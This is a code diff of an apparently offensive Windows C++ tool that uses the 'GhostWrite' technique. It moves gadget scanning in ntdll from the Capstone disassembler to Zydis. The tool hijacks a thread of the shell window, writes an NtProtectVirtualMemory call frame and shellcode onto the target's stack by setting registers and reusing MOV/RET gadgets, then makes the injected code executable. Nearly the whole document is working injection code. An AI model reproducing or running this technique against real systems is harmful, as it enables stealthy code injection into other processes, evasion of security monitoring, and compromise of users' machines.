@@ -1,9 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <tchar.h>
-#include "include/capstone/capstone.h"
-
-#pragma comment(lib, "capstone.lib")
+#include "Zydis/Zydis.h"
 
 
 INT EntryPoint = 0x10; // Shellcode入口偏移
@@ -47,18 +45,46 @@ BYTE Shellcode[] = {
 };
 
 struct GW {
-	enum REG { Rbx, Rsi, Rdi };
-
-	REG OPL; // 目的寄存器
-	REG OPR; // 源寄存器
+	enum REG { None, Rbx, Rsi, Rdi, End };
 
 	PVOID JMPTOSELFAddress;
 	PVOID MOVRETAddress;
 
-	INT Displacement; // 位移数
-	INT PopCount; // POP计数
-	INT RspCompensation; // RSP补偿
+	REG Operands[2];
+	INT64 Displacement; // 位移数
+	INT64 PopCount; // POP计数
+	INT64 RspCompensation; // RSP补偿
 };
+
+GW::REG Translate(ZydisRegister Reg) {
+
+	switch (Reg)
+	{
+	case ZYDIS_REGISTER_RBX:
+		return GW::Rbx;
+	case ZYDIS_REGISTER_RSI:
+		return GW::Rsi;
+	case ZYDIS_REGISTER_RDI:
+		return GW::Rdi;
+	default:
+		return GW::None;
+	}
+}
+
+DWORD64* Translate(GW::REG Reg, CONTEXT* ThreadContext) {
+
+	switch (Reg)
+	{
+	case GW::Rbx:
+		return &(ThreadContext->Rbx);
+	case GW::Rsi:
+		return &(ThreadContext->Rsi);
+	case GW::Rdi:
+		return &(ThreadContext->Rdi);
+	default:
+		return NULL;
+	}
+}
 
 BOOL FindJMPTOSELFAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
 {
@@ -74,152 +100,135 @@ BOOL FindJMPTOSELFAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
 
 BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
 {
-	csh Handle;
-	if (cs_open(CS_ARCH_X86, CS_MODE_64, &Handle)) {
-		_tprintf(_T("[x] Failed to initialize engine\n"));
-		return FALSE;
-	}
+	ZydisDecoder Decoder;
+	ZydisDecoderInit(&Decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);
 
-	// 启用细节选项
-	cs_option(Handle, CS_OPT_DETAIL, CS_OPT_ON);
+	ZydisDecodedInstruction Instruction;
+	ZydisDecodedOperand Operands[ZYDIS_MAX_OPERAND_COUNT];
 
-	const int MAX_OPCODE_SIZE = 16; // OP指令的最大长度
-	const int MAX_OPCODE_COUNT = 5; // 一次性反汇编的数量
+	INT MAX_INST_ALLOW_COUNT = 5; // MOVRET指令最多允许多少条指令
+	PVOID Terminus = NTDLLCode + NTDLLCodeSize - MAX_INST_ALLOW_COUNT * ZYDIS_MAX_INSTRUCTION_LENGTH;
 
-	for (unsigned int i = 0; i < NTDLLCodeSize - MAX_OPCODE_SIZE * MAX_OPCODE_COUNT; i++) {
+	for (PVOID RuntimeAddress = NTDLLCode; RuntimeAddress < Terminus;
+		RuntimeAddress = (PVOID)((UINT_PTR)RuntimeAddress + Instruction.length)) {
 
-		// 一次性反汇编 MAX_OPCODE_COUNT 条指令
-		cs_insn* Insn;
-		SIZE_T Count = cs_disasm(Handle, NTDLLCode + i, MAX_OPCODE_SIZE * MAX_OPCODE_COUNT, 0, MAX_OPCODE_COUNT, &Insn);
-		if (Count == 0)
+		// 尝试解码
+		if (ZYAN_FALSE == ZYAN_SUCCESS(ZydisDecoderDecodeFull(
+			&Decoder,
+			RuntimeAddress,
+			ZYDIS_MAX_INSTRUCTION_LENGTH,
+			&Instruction,
+			Operands))) {
+
+			// 如果解码失败则跳过当前字节
+			RuntimeAddress = (PVOID)((UINT_PTR)RuntimeAddress + 1);
 			continue;
+		}
 
-		// 初始化
+		// 初始化鬼写结构体
 		Ghost->MOVRETAddress = 0;
 		Ghost->Displacement = 0;
 		Ghost->PopCount = 0;
 		Ghost->RspCompensation = 0;
 
-		// 开始检查指令
-		for (unsigned int j = 0; j < Count; j++) {
+		//
+		// 寻找符合条件的MOV指令
+		//
 
-			// 第一项必须为 mov [reg1], reg2
-			if (j == 0) {
+		if (Instruction.mnemonic != ZYDIS_MNEMONIC_MOV)
+			continue;
 
-				if (strcmp(Insn->mnemonic, "mov") != 0)
-					break;
+		// 要求左操作数为内存，右操作数为寄存器
+		if (Operands[0].type != ZYDIS_OPERAND_TYPE_MEMORY || Operands[1].type != ZYDIS_OPERAND_TYPE_REGISTER)
+			continue;
 
-				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
-				cs_x86_op* opr = &(Insn[j].detail->x86.operands[1]);
+		// 检查右操作是否为非易蒸发寄存器
+		if (Operands[1].reg.value != ZYDIS_REGISTER_RBX &&
+			Operands[1].reg.value != ZYDIS_REGISTER_RSI &&
+			Operands[1].reg.value != ZYDIS_REGISTER_RDI)
+			continue;
 
-				// 要求左操作数为内存，右操作数为寄存器
-				if (opl->type != X86_OP_MEM || opr->type != X86_OP_REG) 
-					break;
+		// 检查左操作数是否为非易蒸发寄存器
+		if (Operands[0].mem.base != ZYDIS_REGISTER_RBX &&
+			Operands[0].mem.base != ZYDIS_REGISTER_RSI &&
+			Operands[0].mem.base != ZYDIS_REGISTER_RDI)
+			continue;
 
-				// 检查右操作是否为非易蒸发寄存器
-				if (opr->reg != X86_REG_RBX &&
-					opr->reg != X86_REG_RSI &&
-					opr->reg != X86_REG_RDI)
-					break;
-				
+		// 左操作数是否等于右操作数
+		if (Operands[0].mem.base == Operands[1].reg.value)
+			continue;
 
-				// 检查左操作数是否为非易蒸发寄存器
-				if (opl->mem.base != X86_REG_RBX &&
-					opl->mem.base != X86_REG_RSI &&
-					opl->mem.base != X86_REG_RDI)
-					break;
+		// 鬼写结构体保存寄存器
+		Ghost->Operands[0] = Translate(Operands[0].mem.base);
+		Ghost->Operands[1] = Translate(Operands[1].reg.value);
 
-				// 左操作数是否等于右操作数
-				if (opl->mem.base == opr->reg)
-					break;
+		// 鬼写结构体保存位移
+		if (Operands[0].mem.disp.has_displacement)
+			Ghost->Displacement = Operands[0].mem.disp.value;
 
-				// 保存源寄存器
-				switch (opr->reg)
-				{
-				case X86_REG_RBX:
-					Ghost->OPR = GW::Rbx;
-					break;
-				case X86_REG_RSI:
-					Ghost->OPR = GW::Rsi;
-					break;
-				case X86_REG_RDI:
-					Ghost->OPR = GW::Rdi;
-					break;
-				}
+		//
+		// 寻找符合条件的RET指令
+		//
 
-				// 保存目标寄存器
-				switch (opl->mem.base)
-				{
-				case X86_REG_RBX:
-					Ghost->OPL = GW::Rbx;
-					break;
-				case X86_REG_RSI:
-					Ghost->OPL = GW::Rsi;
-					break;
-				case X86_REG_RDI:
-					Ghost->OPL = GW::Rdi;
-					break;
-				}
+		PVOID PeekAddress = (PVOID)((UINT_PTR)RuntimeAddress + Instruction.length);
 
-				// 保存左操作数的位移数
-				Ghost->Displacement = (INT)opl->mem.disp;
-			}
+		for (int i = 1; i < MAX_INST_ALLOW_COUNT; i++) {
+
+			// 如果解码失败就直接放弃
+			if (ZYAN_FALSE == ZYAN_SUCCESS(ZydisDecoderDecodeFull(
+				&Decoder,
+				PeekAddress,
+				ZYDIS_MAX_INSTRUCTION_LENGTH,
+				&Instruction,
+				Operands)))
+				break;
+
+			// 移动到下一条指令
+			PeekAddress = (PVOID)((UINT_PTR)PeekAddress + Instruction.length);
 
 			// 寻找 ret 指令
-			else if (strcmp(Insn[j].mnemonic, "ret") == 0) {
+			if (Instruction.mnemonic == ZYDIS_MNEMONIC_RET) {
 
-				Ghost->MOVRETAddress = NTDLLCode + i;
+				Ghost->MOVRETAddress = RuntimeAddress;
 
-#ifdef DEBUG
-				printf("[D] Found MOV RET Opcode:\n");
-				for (unsigned int k = 0; k <= j; k++)
-					_tprintf(_T("[D] 0x%p:\t%hs\t\t%hs\n"), NTDLLCode + i, Insn[k].mnemonic, Insn[k].op_str);
-#endif // DEBUG
-
-				// 找到符合条件的 MOVRETAddress 后直接返回
-				cs_free(Insn, Count);
-				cs_close(&Handle);
 				return TRUE;
 			}
 
 			// 允许 mov reg, ?? 指令
-			else if (strcmp(Insn[j].mnemonic, "mov") == 0) {
-
-				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
+			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_MOV) {
 
 				// 要求左操作数为寄存器
-				if (opl->type != X86_OP_REG) {
+				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER)
 					break;
-				}
 			}
 
 			// 允许 add rsp, ?? 指令
-			else if (strcmp(Insn[j].mnemonic, "add") == 0) {
-
-				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
-				cs_x86_op* opr = &(Insn[j].detail->x86.operands[1]);
+			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_ADD) {
 
 				// 要求左操作数为寄存器，右操作数为立即数
-				if (opl->type != X86_OP_REG || opr->type != X86_OP_IMM)
+				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER || Operands[1].type != ZYDIS_OPERAND_TYPE_IMMEDIATE)
 					break;
 
 				// 如果左操作数是rsp，则保存立即数
-				if (opl->reg == X86_REG_RSP)
-					Ghost->RspCompensation = (INT)opr->imm;
+				if (Operands[0].reg.value == ZYDIS_REGISTER_RSP) {
+					if (Operands[1].imm.is_signed)
+						Ghost->RspCompensation += Operands[1].imm.value.s;
+					else
+						Ghost->RspCompensation += Operands[1].imm.value.u;
+				}
 			}
 
 			// 允许 xor reg, ?? 指令
-			else if (strcmp(Insn[j].mnemonic, "xor") == 0) {
-
-				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
+			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_XOR) {
 
 				// 要求左操作数为寄存器
-				if (opl->type != X86_OP_REG)
+				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER)
 					break;
 			}
 
 			// 允许 pop reg 指令
-			else if (strcmp(Insn[j].mnemonic, "pop") == 0) {
+			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_POP) {
+
 				Ghost->PopCount += 1;
 			}
 
@@ -228,11 +237,7 @@ BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
 				break;
 			}
 		}
-
-		cs_free(Insn, Count);
 	}
-
-	cs_close(&Handle);
 
 	return FALSE;
 }
@@ -258,7 +263,7 @@ BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOS
 
 	do {
 		ResumeThread(Thread);
-		Sleep(3);
+		Sleep(10);
 		SuspendThread(Thread);
 
 		if (GetThreadContext(Thread, ThreadContext) == 0) {
@@ -278,51 +283,17 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 	ThreadContext.ContextFlags = CONTEXT_FULL;
 	GetThreadContext(Thread, &ThreadContext);
 
-	// 设置右操作数
-	DWORD64* OPR;
-
-	switch (Ghost->OPR)
-	{
-	case GW::Rbx:
-		OPR = &ThreadContext.Rbx;
-		break;
-	case GW::Rsi:
-		OPR = &ThreadContext.Rsi;
-		break;
-	case GW::Rdi:
-		OPR = &ThreadContext.Rdi;
-		break;
-	default:
-		OPR = NULL;
-		break;
-	}
-
-	if (OPR == NULL) {
-		_tprintf(_T("[x] Unsupported source register: %d\n"), Ghost->OPR);
+	// 设置左操作数
+	DWORD64* Operand0 = Translate(Ghost->Operands[0], &ThreadContext);
+	if (Operand0 == NULL) {
+		_tprintf(_T("[x] Unsupported operand, Operands[0]: %d\n"), Ghost->Operands[0]);
 		return FALSE;
 	}
 
-	// 设置左操作数
-	DWORD64* OPL;
-
-	switch (Ghost->OPL)
-	{
-	case GW::Rbx:
-		OPL = &ThreadContext.Rbx;
-		break;
-	case GW::Rsi:
-		OPL = &ThreadContext.Rsi;
-		break;
-	case GW::Rdi:
-		OPL = &ThreadContext.Rdi;
-		break;
-	default:
-		OPL = NULL;
-		break;
-	}
-
-	if (OPL == NULL) {
-		_tprintf(_T("[x] Unsupported destination register: %d\n"), Ghost->OPL);
+	// 设置右操作数
+	DWORD64* Operand1 = Translate(Ghost->Operands[1], &ThreadContext);
+	if (Operand1 == NULL) {
+		_tprintf(_T("[x] Unsupported operand, Operands[1]: %d\n"), Ghost->Operands[1]);
 		return FALSE;
 	}
 
@@ -364,10 +335,10 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 	ThreadContext.Rsp = StackTopAddress;
 
 	// 源寄存器储存将要写入的数据
-	*OPR = (DWORD64)Ghost->JMPTOSELFAddress;
+	*Operand1 = (DWORD64)Ghost->JMPTOSELFAddress;
 
 	// 目的寄存器储存将要写入的地址
-	*OPL = ThreadContext.Rsp
+	*Operand0 = ThreadContext.Rsp
 		+ Ghost->RspCompensation				// 平衡RSP的补偿
 		+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
 		- Ghost->Displacement;					// 修正MOV指令中的位移地址
@@ -387,7 +358,9 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 	ThreadContext.Rsp = StackTopAddress;
 
 	// 这是个fastcall调用约定的函数，传参顺序 RCX RDX R8 R9，OldAccessProtection参数使用压栈传递
-	 
+	//
+	// NtProtectVirtualMemory 函数声明如下：
+	//
 	// NTSTATUS NtProtectVirtualMemory(
 	//		HANDLE ProcessHandle,
 	//		PVOID* BaseAddress,
@@ -435,10 +408,10 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 		ThreadContext.Rsp = StackTopAddress;
 
 		// 源寄存器储存将要写入的数据
-		*OPR = NtProtectVirtualMemoryCallFrame[i];
+		*Operand1 = NtProtectVirtualMemoryCallFrame[i];
 
 		// 目的寄存器储存将要写入的地址
-		*OPL = ThreadContext.Rsp
+		*Operand0 = ThreadContext.Rsp
 			+ BytesOfJmpToSelfAddress
 			+ i * sizeof(PVOID)
 			+ Ghost->RspCompensation				// 平衡RSP的补偿
@@ -494,10 +467,10 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 		ThreadContext.Rsp = StackTopAddress;
 
 		// 源寄存器储存将要写入的数据
-		*OPR = ((DWORD64*)Shellcode)[i];
+		*Operand1 = ((DWORD64*)Shellcode)[i];
 
 		// 目的寄存器储存将要写入的地址
-		*OPL = ThreadContext.Rsp
+		*Operand0 = ThreadContext.Rsp
 			+ BytesOfJmpToSelfAddress
 			+ i * sizeof(PVOID)
 			+ Ghost->RspCompensation				// 平衡RSP的补偿
@@ -542,7 +515,10 @@ int _tmain(int argc, TCHAR* argv[])
 {
 	// 获取ntdll模块
 	HMODULE NTDLLBase = GetModuleHandle(_T("ntdll.dll"));
-	if (NTDLLBase == NULL) {
+	if (NTDLLBase != NULL) {
+		_tprintf(_T("[+] NTDLLBase = %p\n"), NTDLLBase);
+	}
+	else{
 		_tprintf(_T("[x] Failed to get ntdll.dll module\n"));
 		return 0;
 	}
@@ -564,26 +540,25 @@ int _tmain(int argc, TCHAR* argv[])
 
 	// 获取自跳转地址
 	if (FindJMPTOSELFAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
-		_tprintf(_T("[+] JMPTOSELFAddress = %p\n"), Ghost.JMPTOSELFAddress);
+		_tprintf(_T("[+] JMP SELF Address = %p\n"), Ghost.JMPTOSELFAddress);
 	}
 	else {
-		_tprintf(_T("[x] Failed to find JMPTOSELFAddress\n"));
+		_tprintf(_T("[x] Failed to find JMP SELF Address\n"));
 		return 0;
 	}
 
 	// 获取转移返回地址
 	if (FindMOVRETAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
-		_tprintf(_T("[+] MOVRETAddress = %p\n"), Ghost.MOVRETAddress);
+		_tprintf(_T("[+] MOV RET Address = %p\n"), Ghost.MOVRETAddress);
 	}
 	else {
-		_tprintf(_T("[x] Failed to find MOVRETAddress\n"));
+		_tprintf(_T("[x] Failed to find MOV RET Address\n"));
 		return 0;
 	}
 
 	// 打开线程
-	// HWND Window = FindWindow(NULL, _T("HashCalc"));
-	HWND Window = FindWindow(_T("CalcFrame"), NULL);
-	// HWND Window = GetShellWindow();
+	// HWND Window = FindWindow(_T("CalcFrame"), NULL);
+	HWND Window = GetShellWindow();
 	if (Window == NULL) {
 		_tprintf(_T("[x] Can't find target window\n"));
 		return 0;
